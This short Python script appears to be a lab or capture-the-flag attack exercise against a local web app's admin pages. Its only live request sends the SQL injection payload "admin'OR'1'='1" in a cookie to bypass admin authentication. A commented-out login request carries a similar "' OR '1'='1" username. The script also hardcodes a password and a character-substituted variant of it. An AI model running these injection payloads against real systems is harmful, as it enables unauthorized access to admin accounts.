import functools
import itertools
import os
import sys
import time 
from datetime import timedelta
import smtplib
from email.message import EmailMessage
import string
import re
import requests


# GLOBAL DATA
url = "http://127.0.0.1:8080/admin/login"




OLDPASSWORD = "aw2246french44pledgeor"
OLDMUTATED = "4w2246french44pledge0r"



#resp = requests.post(url, data={"username": "' OR '1'='1", "password": "password"})

cookies = {"x-user-id": "admin'OR'1'='1"}
resp = requests.get("http://localhost:8080/admin/panel", cookies=cookies)

print(resp.status_code)
print(resp.request.headers)
print(resp.text)